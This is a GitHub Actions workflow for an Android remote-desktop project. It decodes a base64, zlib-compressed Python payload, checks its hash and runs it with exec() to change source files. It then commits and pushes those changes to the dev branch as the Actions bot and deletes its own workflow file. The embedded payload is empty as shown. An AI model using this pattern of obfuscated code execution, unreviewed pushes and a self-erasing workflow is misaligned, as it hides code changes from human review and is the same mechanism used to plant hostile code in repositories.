name: Publish scoped physical desktop right click
on:
  push:
    branches: [dev]
    paths: [.github/workflows/publish-desktop-right-click.yml]
permissions:
  contents: write
concurrency:
  group: publish-desktop-right-click-dev
  cancel-in-progress: false
jobs:
  publish:
    if: github.repository == 'iecxiv/meshfabric' && github.ref == 'refs/heads/dev'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.sha }}
          fetch-depth: 2
      - name: Verify approved base
        run: test "$(git rev-parse HEAD^)" = 9b12d2e91e0973681701e9033728d59fb8b05938
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - uses: android-actions/setup-android@v3
        with:
          packages: platform-tools
          log-accepted-android-sdk-licenses: false
      - run: sdkmanager "platforms;android-35" "build-tools;35.0.0"
      - uses: gradle/actions/setup-gradle@v4
      - name: Apply canvas-scoped right-click trial
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import base64, hashlib, zlib
          payload = ''
          source = zlib.decompress(base64.b64decode(payload))
          assert hashlib.sha256(source).hexdigest() == 'c9fd6d6e4cb5fb03d3552a1587ee070c6779b6236f84f474d47628866a45099f'
          exec(compile(source, 'approved_desktop_right_click', 'exec'), {'__name__': '__main__'})
          PY
          git diff --check
      - name: Build APK and run JVM tests
        run: bash ./gradlew :app:assembleDebug :app:testDebugUnitTest --no-daemon --stacktrace
      - name: Publish verified trial and remove temporary workflow
        shell: bash
        run: |
          set -euo pipefail
          git add -- app/src/main/java/iecxiv/meshfabric/MainActivity.kt app/src/main/java/iecxiv/meshfabric/ui/desktop/RemoteDesktopScreen.kt app/src/main/java/iecxiv/meshfabric/ui/desktop/DesktopMouseCapture.kt app/src/main/java/iecxiv/meshfabric/ui/desktop/DesktopRightClickPolicy.kt app/src/test/java/iecxiv/meshfabric/ui/desktop/DesktopRightClickPolicyTest.kt docs/desktop-physical-right-click.md
          git rm .github/workflows/publish-desktop-right-click.yml
          git diff --cached --check
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git commit -m 'fix(desktop): route physical right click to remote canvas'
          git push origin HEAD:refs/heads/dev
      - name: Upload APK and test reports
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: desktop-right-click-${{ github.run_id }}-${{ github.run_attempt }}
          path: |
            app/build/outputs/apk/debug/*.apk
            app/build/reports/tests/
            app/build/test-results/
          if-no-files-found: ignore
          retention-days: 7
